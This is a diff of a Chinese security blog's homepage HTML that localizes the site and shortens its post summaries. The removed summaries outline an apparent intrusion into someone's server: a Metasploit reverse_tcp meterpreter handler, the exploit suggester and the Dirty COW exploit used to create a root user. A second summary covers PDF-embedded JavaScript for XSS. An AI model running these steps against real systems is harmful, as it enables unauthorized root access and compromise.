@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="">
+<html lang="zh-CN">
     <head>
 	<meta name="generator" content="Hugo 0.102.3" />
         <meta charset="utf-8">
@@ -23,7 +23,10 @@
     {
         "@context": "http://schema.org",
         "@type": "WebSite",
-        "url": "https:\/\/aftermorr0w.github.io\/","description": "Get01d 's blog","name": "AFTERMORR0W"
+        "url": "https:\/\/aftermorr0w.github.io\/","inLanguage": "zh-CN","author": {
+                "@type": "Person",
+                "name": "AfterMorr0w"
+            },"description": "Get01d 's blog","name": "AFTERMORR0W"
     }
     </script></head>
     <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
@@ -34,7 +37,7 @@
             <a href="/" title="AFTERMORR0W">AfterMorr0w</a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 文章标签 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                     <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                 </a></div>
         </div>
@@ -49,66 +52,39 @@
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">文章标签</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                 <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
             </a></div>
     </div>
 </header><main class="main">
-                <div class="container"><div class="page home" data-home="posts"><div class="home-profile"><div class="home-avatar"><img
+                <div class="container"><div class="page home" data-home="posts"><div class="home-profile"><div class="home-avatar"><a href="/posts/" title="文章"><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="https://i.imgtg.com/2022/09/14/yKq3r.jpg"
         data-srcset="https://i.imgtg.com/2022/09/14/yKq3r.jpg, https://i.imgtg.com/2022/09/14/yKq3r.jpg 1.5x, https://i.imgtg.com/2022/09/14/yKq3r.jpg 2x"
         data-sizes="auto"
         alt="https://i.imgtg.com/2022/09/14/yKq3r.jpg"
-        title="https://i.imgtg.com/2022/09/14/yKq3r.jpg" /></div><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"><a href="https://github.com/https://github.com/AfterMorr0w" title="GitHub" target="_blank" rel="noopener noreffer me"><i class="fab fa-github fa-fw" aria-hidden="true"></i></a><a href="https://weibo.com/https://weibo.com/7770279120" title="微博" target="_blank" rel="noopener noreffer me"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></div></div>
+        title="https://i.imgtg.com/2022/09/14/yKq3r.jpg" /></a></div><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"><a href="https://github.com/https://github.com/AfterMorr0w" title="GitHub" target="_blank" rel="noopener noreffer me"><i class="fab fa-github fa-fw" aria-hidden="true"></i></a><a href="https://weibo.com/https://weibo.com/7770279120" title="微博" target="_blank" rel="noopener noreffer me"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/">对某傀儡机的提权操作</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-09-13">2022-09-13</time></span></div><div class="content">前言 链接：https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/
-我们废了半天劲拿下了他的服务器，现在回过头来对其linux服务器进行提权
-还是使用我们万能的msf 这里介绍的是suggester模块，该模块可以教我们如何快速的查找目标可用的提权EXP
-设置session 我们先连上我们的msf 设置一个session vps操作
-use exploit/multi/handlerset payload php/meterpreter/reverse_tcpshow optionsset lhost 0.0.0.0run 我们会获取一个会话session
-suggester查找有用EXP backgroundsearch suggesteruse 0optionsset session 1run 真TM牛逼，还以为是个好的文章素材呢，这就翻车了
-赃牛提权CVE-2016-5195 Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）
-uname -a 查看linus内核 刚好满足赃牛提权的条件
-那就试一试
-利用exp2 应该是这个服务器的gcc版本问题，exp1失败了
-链接：https://github.com/FireFart/dirtycow
-upload filename_path path 将exp传到傀儡机
-到达exp的目录 然后运行make编译 make如果不成功 运行下面的指令也一样
-gcc -pthread dirty.c -o dirty –lcrypt 然后再运行./dirty 会让你输入new password 这个就是给你创建一个新的超级管理员用户
-添加的时候会需要等一会
-然后su - firefart 切换用户 报错： standard in must be a tty</div><div class="post-footer">
-        <a href="/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/">Read More</a><div class="post-tags">
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>AfterMorr0w</a></span>&nbsp;<span class="post-publish">发布于 <time datetime="2022-09-13">2022-09-13</time></span></div><div class="content">前言 链接：https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascri</div><div class="post-footer">
+        <a href="/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/">阅读全文</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div></div>
 </article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/">PDF写入javascript造成XSS</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-04-03">2022-04-03</time></span></div><div class="content">前言 前几天了解了PDF XSS 感觉这是个特别有意思的知识点，确实XSS称霸漏洞排行榜前几以来，哪个不知道见框就插，把代码写入点写死或者加上过滤你就没辙了
-介绍 Pdf文件是应用广泛的一种文件格式，发展至今已经到了2.0版本，其功能也得到了不断丰富，很多鲜为人知的功能可能会被利用实施恶意行为。本文将简单介绍在pdf文件 中嵌入Javasript脚本的利用方式。
-很多针对Adobe阅读器的CVE漏洞都是通过pdf文件中的某些结构触发，触发过程都需要执行事先嵌入在pdf文件中的Javascript脚本
-主要的利用方式
-通过Javascript调用pdf中的模块进行攻击； 通过Javascript调用阅读器中提供的Javascript相关功能，进行攻击； 其他未知形式的攻击。 函数介绍 在pdf阅读器支持的所有Javascript函数中以下函数在实际应用中，还是可以对用户的使用造成一些困扰：
-app.launchURL()、app.media.getURLdata()、app.alert()、app.execDialog()、doc.getURL。 1、app.launchURL()函数功能为访问远程url。当打开包含该函数的pdf文件时，首先会弹出窗口提醒用户建立远程链接，随后使用默认浏览器打开一个远程连接。 2、app.media.getURLdata()函数功能为打开url指定的多媒体文件。当打开包含该函数的pdf文件时，首先会弹出窗口提醒用户建立远程链接，随后根据版本和应用不同 可能会有安全提示，随后需要用户手动选择信任，最终使用系统默认的播放器播放URL指定的文件。 3、app.alert()函数功能为弹出一个警示对话框。 4、app.execDialog()函数的功能为创建一个对话框。 5、doc.getURL函数功能为通过GET方法获取URL指向文件。
-利用方法 使用迅捷PDF编辑器，这个不需要注册会员，下下来直接用就好 先新建一个空白页面
-再添加页面属性
-添加javascript代码
-这里需要注意的是：Adobe 支持自身的 JavaScript 对象模型，例如 alert(‘xss’)必须被 APP 对象调用，因此变成了 app.alert(‘xss’)。这意味着，利用 JavaScript 进行攻击时只能使用 Adobe 所支持的功能。
-经过测试，目前火狐、谷歌、360、edge都支持 换言之，只要存在在线打开浏览文件的功能点就存在存储型XSS
-PDF中可以藏恶意代码了是不是可以将这个漏洞扩展一下
-参考链接： https://www.cnblogs.com/xiaozi/p/9951622.html</div><div class="post-footer">
-        <a href="/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/">Read More</a><div class="post-tags">
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>AfterMorr0w</a></span>&nbsp;<span class="post-publish">发布于 <time datetime="2022-04-03">2022-04-03</time></span></div><div class="content">前言 前几天了解了PDF XSS 感觉这是个特别有意思的知识点，确实XSS称霸漏洞排行榜前几以来，哪个不知道见框就插，把代码写入点写死或者加上过滤你就</div><div class="post-footer">
+        <a href="/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/">阅读全文</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div></div>
 </article></div></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">AfterMorr0w</a></span></div>
         </div>
     </footer></div>
 
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                 <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"data":{"id-1":"对于最有能力的领航人风浪总是格外的汹涌"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"data":{"id-1":"对于最有能力的领航人风浪总是格外的汹涌"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
